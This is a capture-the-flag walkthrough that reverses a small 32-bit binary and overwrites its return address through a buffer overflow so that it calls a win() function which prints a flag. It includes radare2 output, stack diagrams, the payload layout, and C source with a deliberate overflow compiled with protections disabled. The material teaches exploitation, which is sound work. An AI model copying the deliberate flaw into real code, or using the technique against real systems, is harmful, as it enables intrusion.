# WACTF Challenge walkthrough

## Step by Step

### Background
- A service is running somewhere, you are told that this service can be made to print a flag, but you have no idea how.
- You *do* have a copy of the compiled binary though: `jtr`

### Analysis
- First, the old favourite: `strings jtr`
    - No luck :(
    - But we can see "/bin/cat flag.txt" in the output, so we can guess that the flag is on the server.
    - Maybe there's a way to make the program reveal the server's flag.txt to us?
- Get a better idea of what we're looking at: `file jtr`
    ```
    jtr: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9f9c674fd7eccfc8b2539fe97be04f7373663e6c, not stripped
    ```
    - ELF
    - x86
    - dynamically linked
    - not stripped
- A closer look at the binary's security features: `rabin2 -I jtr`
    ```
    arch     x86
    binsz    6031
    bintype  elf
    bits     32
    canary   false
    class    ELF32
    crypto   false
    endian   little
    havecode true
    intrp    /lib/ld-linux.so.2
    lang     c
    linenum  true
    lsyms    true
    machine  Intel 80386
    maxopsz  16
    minopsz  1
    nx       true
    os       linux
    pcalign  0
    pic      false
    relocs   true
    relro    partial
    rpath    NONE
    static   false
    stripped false
    subsys   linux
    va       true
    ```
    - Of interest are:
        - canary = false
            - No stack canaries means stack smashing is possible
        - nx = true
            - The stack isn't executable. We can't write shellcode to the stack and have it execute. Important!
        - pic = false
            - Not Position-Independent Code (PIC). Locally-defined functions will be found at constant addresses listed in the symbol table, even if ASLR is enabled.
- Run it! `./jtr`
    - Looks like it reads something from stdin and just exits?
    - Buffer overflow? `python -c 'print("A" * 100)' | ./jtr`
    ```
    Thanks, bye!
    [1]    46025 done                python -c 'print("A" * 100)' |
           46026 segmentation fault  ./jtr
    ```
    - At this point we know we're not going to be able to execute shellcode on the stack, but we seem to be able to overwrite something important.
- Time to start reversing! `r2 -AA jtr`
- What symbols is it importing? `ii`
    ```
    [Imports]
    001 0x08048350 GLOBAL FUNC fgets
    002 0x08048360 GLOBAL FUNC puts
    003 0x08048370 GLOBAL FUNC system
    004 0x00000000 WEAK NOTYPE __gmon_start__
    005 0x08048380 GLOBAL FUNC __libc_start_main
    ```
    - system() is being imported, this is interesting. Remember we saw "/bin/cat flag.txt" in strings output.
- What about local functions? `afl`
    ```
    0x08048000    5 415  -> 329  fcn.08048000
    0x0804819f    1 9            fcn.0804819f
    0x080481a8   23 395  -> 398  fcn.080481a8
    0x08048310    3 35           sym._init
    0x08048333    1 25           fcn.08048333
    0x0804834c    1 4            sub.fgets_12_34c
    0x08048350    1 6            sym.imp.fgets
    0x08048360    1 6            sym.imp.puts
    0x08048370    1 6            sym.imp.system
    0x08048380    1 6            sym.imp.__libc_start_main
    0x08048390    1 6            sub.__gmon_start___252_390
    0x080483a0    1 33           entry0
    0x080483d0    1 4            sym.__x86.get_pc_thunk.bx
    0x080483e0    4 50   -> 41   sym.deregister_tm_clones
    0x08048420    3 52           sym.register_tm_clones
    0x08048460    3 34   -> 31   sym.__do_global_dtors_aux
    0x08048490    1 6            entry1.init
    0x08048496    1 25           sym.win
    0x080484af    1 52           sym.lolol
    0x080484e3    1 37           sym.main
    0x08048510    4 93           sym.__libc_csu_init
    0x08048570    1 2            sym.__libc_csu_fini
    0x08048574    1 20           sym._fini
    ```
    - win(), main(), and lolol() are likely to contain user-defined code
- The win() function seems to be of interest. Let's have a look: `pdf@sym.win`
    ```
    / (fcn) sym.win 25
    |   sym.win ();
    |           0x08048496      55             push ebp
    |           0x08048497      89e5           mov ebp, esp
    |           0x08048499      83ec08         sub esp, 8
    |           0x0804849c      83ec0c         sub esp, 0xc
    |           0x0804849f      6890850408     push str.bin_cat_flag.txt   ; 0x8048590 ; "/bin/cat flag.txt" ; const char * string
    |           0x080484a4      e8c7feffff     call sym.imp.system         ; int system(const char *string)
    |           0x080484a9      83c410         add esp, 0x10
    |           0x080484ac      90             nop
    |           0x080484ad      c9             leave
    \           0x080484ae      c3             ret
    ```
    - Broken down a bit more:
        - Function prologue
        ```
        push ebp
        mov ebp, esp
        ```
        - Push a string containing "/bin/cat flag.txt" onto the stack as a parameter for system() and then call system()
        ```
        sub esp, 8
        sub esp, 0xc
        push str.bin_cat_flag.txt   ; 0x8048590 ; "/bin/cat flag.txt" ; const char * string
        call sym.imp.system         ; int system(const char *string)
        add esp, 0x10
        ```
        - Function epilogue
        ```
        nop
        leave
        ret
        ```
    - Apparently if win() executes we will in fact win!
- But how?
    - We already know we can overwrite data on the stack
    - But we can't get code written on the stack to execute due to NX
    - But we don't need to! All we need to do is get win() to execute.
    - We can see through reversing that lolol() is getting user input through fgets() 
    - We can overwrite the saved return address during lolol()'s execution (which will point to the next instruction in main() after `call sym.lolol` to instead point to the beginning of win().
- lolol()'s stack frame before fgets() is called:
    ```
         +----------------+ <- esp points here
    0x00 |    char *s     | \
         |----------------| |
    0x04 |    int size    | | params to fgets() 
         |----------------| | 
    0x08 |  FILE *stream  | /
         |----------------|
    0x0c |       ??       | 
         |----------------| <- *s points here
    0x10 |  char a[0x28]  | 
         |----------------|
    0x14 |       ..       |
         |----------------|
    0x18 |       ..       |
         |----------------|
    0x1c |       ..       |
         |----------------|
    0x20 |       ..       |
         |----------------|
    0x24 |       ..       |
         |----------------|
    0x28 |       ..       |
         |----------------|
    0x2c |       ..       |
         |----------------|
    0x30 |       ..       |
         |----------------|
    0x34 |       ..       |
         |----------------| <- ebp points here
    0x38 |   saved ebp    |
         |----------------|
    0x3c |   saved eip    |
         +----------------+
                  | previous stack frame
                  v
    ```
- lolol()'s stack frame after we input 44 'A' characters. EIP has been partly overwritted by LF, null byte
    ```
         +----------------+ <- esp points here
    0x00 |    char *s     | \
         |----------------| |
    0x04 |    int size    | | params to fgets() 
         |----------------| | 
    0x08 |  FILE *stream  | /
         |----------------|
    0x0c |       ??       | 
         |----------------| <- *s points here
    0x10 |      AAAA      | 
         |----------------|
    0x14 |      AAAA      |
         |----------------|
    0x18 |      AAAA      |
         |----------------|
    0x1c |      AAAA      |
         |----------------|
    0x20 |      AAAA      |
         |----------------|
    0x24 |      AAAA      |
         |----------------|
    0x28 |      AAAA      |
         |----------------|
    0x2c |      AAAA      |
         |----------------|
    0x30 |      AAAA      |
         |----------------|
    0x34 |      AAAA      |
         |----------------| <- ebp points here
    0x38 |      AAAA      |
         |----------------|
    0x3c |  0a 00 | eip   |
         +----------------+
                  | previous stack frame
                  v
    ```
- We can get the address of win() easily: `afo sym.win`
    - In little endian as a python string: `"\x96\x84\x04\x08"`
- lolol()'s stack frame after we input 44 'A' characters followed by the address of win() in little endian
    ```
         +----------------+ <- esp points here
    0x00 |    char *s     | \
         |----------------| |
    0x04 |    int size    | | params to fgets() 
         |----------------| | 
    0x08 |  FILE *stream  | /
         |----------------|
    0x0c |       ??       | 
         |----------------| <- *s points here
    0x10 |      AAAA      | 
         |----------------|
    0x14 |      AAAA      |
         |----------------|
    0x18 |      AAAA      |
         |----------------|
    0x1c |      AAAA      |
         |----------------|
    0x20 |      AAAA      |
         |----------------|
    0x24 |      AAAA      |
         |----------------|
    0x28 |      AAAA      |
         |----------------|
    0x2c |      AAAA      |
         |----------------|
    0x30 |      AAAA      |
         |----------------|
    0x34 |      AAAA      |
         |----------------| <- ebp points here
    0x38 |      AAAA      |
         |----------------|
    0x3c |      win()     |
         +----------------+
                  | previous stack frame
                  v
    ```
- Step through in debugger, then show without r2

## The code
```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void win(){
    system("/bin/cat flag.txt");
}

int lolol(){
    char input[32];
    fgets(input, 64, stdin);
    printf("Thanks, bye!\n");
    return 1;
}

int main(){
    int yolo = lolol();
    return yolo;
}
```

- Compile with `gcc -m32 -fno-stack-protector -fno-PIC -no-pie -o jtr jtr.c`
    - `-m32` - Compile as 32-bit to make analysis easier
    - `-fno-stack-protector` - Disable stack canaries to make overflow easier
    - `-fno-PIC` and `-no-pie` - Some gcc's are configured to compile as position independent code by default, we don't want this for this challenge
    - Beware of different default compilation options!
        - `gcc -v` to view compiler configuration
- Include a file "flag.txt" containing a win message in the directory you'll be running it in